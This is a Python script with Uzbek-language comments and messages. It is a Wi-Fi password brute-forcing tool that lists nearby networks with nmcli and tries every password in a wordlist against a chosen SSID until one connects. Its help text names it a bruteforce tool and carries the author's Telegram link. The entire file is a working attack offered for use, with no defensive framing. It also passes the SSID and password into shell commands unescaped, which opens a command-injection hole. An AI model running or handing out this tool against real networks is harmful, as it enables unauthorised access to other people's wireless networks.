import os
import subprocess
import argparse
import time
import logging
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

# Colorama initializatsiyasi
init(autoreset=True)

# Terminalni tozalash
def clear_terminal():
    """
    Terminalni tozalash funktsiyasi.
    """
    os.system('clear' if os.name == 'posix' else 'cls')

# Wi-Fi tarmoqlar ro'yxatini olish
def list_wifi_networks():
    """
    Mavjud Wi-Fi tarmoqlar ro'yxatini chiqaradi.
    """
    try:
        command = 'nmcli device wifi list'
        result = subprocess.run(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            universal_newlines=True
        )
        if result.returncode == 0:
            print(Fore.YELLOW + "\nMavjud Wi-Fi tarmoqlar:")
            print(result.stdout)
        else:
            print(Fore.RED + f"Wi-Fi tarmoqlarni ro'yxatlashda xato: {result.stderr.strip()}")
    except Exception as e:
        print(Fore.RED + f"Xato: {str(e)}")

# `sudo` bilan ishlayotganini tekshirish
if os.geteuid() != 0:
    print("Ushbu dastur `sudo`  bilan ishga tushirilishi kerak.")
    exit(1)

# Logging o'rnatish
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def connect_to_wifi(ssid, password):
    """
    Wi-Fi tarmog'iga berilgan SSID va parol yordamida ulanishni amalga oshiradi.
    """
    command = f'nmcli device wifi connect "{ssid}" password "{password}"'
    
    try:
        result = subprocess.run(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        if result.returncode == 0:
            logging.info(Fore.GREEN + f"[OK] Sinab ko'rilgan parol: {password} | Wi-Fi tarmog'iga muvaffaqiyatli ulandi: {ssid}")
            check_ip_command = "nmcli -t -f IP4.ADDRESS dev show"
            ip_result = subprocess.run(
                check_ip_command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            if ip_result.stdout:
                logging.info(Fore.GREEN + f"[OK] IP manzil muvaffaqiyatli olindi: {ip_result.stdout.strip()}")
                return True
            else:
                logging.error(Fore.RED + f"[XATO] IP manzilni olishda muammo yuz berdi. Xato: {ip_result.stderr.strip()}")
                return False
        else:
            logging.error(Fore.RED + f"[XATO] Sinab ko'rilgan parol: {password} | Xato: {result.stderr.strip()}")
            return False

    except Exception as e:
        logging.error(Fore.RED + f"[XATO] Sinab ko'rilgan parol: {password} | Xato yuz berdi: {str(e)}")
        return False

def brute_force_wifi(ssid, wordlist_file, delay=1, max_workers=1):
    """
    Wordlist fayli yordamida Wi-Fi tarmog'iga ulanishni sinovdan o'tkazadi.
    """
    try:
        with open(wordlist_file, 'r') as file:
            passwords = [p.strip() for p in file.readlines()]
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_password = {
                executor.submit(connect_to_wifi, ssid, password): password
                for password in passwords
            }

            for future in future_to_password:
                password = future_to_password[future]
                try:
                    success = future.result()
                    if success:
                        logging.info(Fore.GREEN + f"To'g'ri parol topildi: {password}")
                        break
                except Exception as exc:
                    logging.error(Fore.RED + f"[XATO] Parol uchun ulanish xatosi yuz berdi: {password} | {exc}")
                time.sleep(delay)
        logging.info("To'g'ri parol topilmadi.")
    
    except FileNotFoundError:
        logging.error(Fore.RED + f"Fayl topilmadi: {wordlist_file}")

def main():
    """
    Dastur asosiy funksiyasi, argumentlarni qabul qiladi va kerakli funksiyalarni chaqiradi.
    """
    clear_terminal()  # Terminalni tozalash

    parser = argparse.ArgumentParser(
        description="Wi-Fi bruteforce vositasi                 サバクオオカミ (Blue hat) Telegram: https://t.me/Xorazmlik_2004 "
    )
    parser.add_argument(
        '-ssid', type=str,
        help="Wi-Fi tarmoq nomi (SSID)", required=False
    )
    parser.add_argument(
        '-f', '--file', type=str,
        help="Wordlist fayli joylashuvi", required=False
    )
    parser.add_argument(
        '-p', '--password', type=str,
        help="Parolni bevosita kiriting", required=False
    )
    parser.add_argument(
        '--delay', type=int, default=1,
        help="Har bir sinov orasidagi kechikish (soniya) (standart: 1)"
    )
    parser.add_argument(
        '--threads', type=int, default=1,
        help="Parallar soni (bir vaqtda bir nechta parollarni sinash) (standart: 1)"
    )
    parser.add_argument(
        '-wifi', action='store_true',
        help="Wi-Fi tarmoqlar ro'yxatini chiqaradi"
    )
    args = parser.parse_args()

    if args.wifi:
        clear_terminal()  # Terminalni tozalash
        list_wifi_networks()
    elif args.help:
        parser.print_help()
        list_wifi_networks()  # Wi-Fi tarmoqlar ro'yxatini chiqarish
    elif args.password:
        logging.info(Fore.YELLOW + f"Parol sinab ko'rilmoqda: {args.password}")
        if connect_to_wifi(args.ssid, args.password):
            logging.info(Fore.GREEN + f"Wi-Fi tarmog'iga muvaffaqiyatli ulandingiz: {args.ssid}")
        else:
            logging.error(Fore.RED + f"Xato parol: {args.password}")
    
    elif args.file:
        brute_force_wifi(args.ssid, args.file, delay=args.delay, max_workers=args.threads)

    else:
        logging.error(Fore.RED + "Hech qanday parol yoki wordlist fayli berilmagan.")

if __name__ == "__main__":
    main()

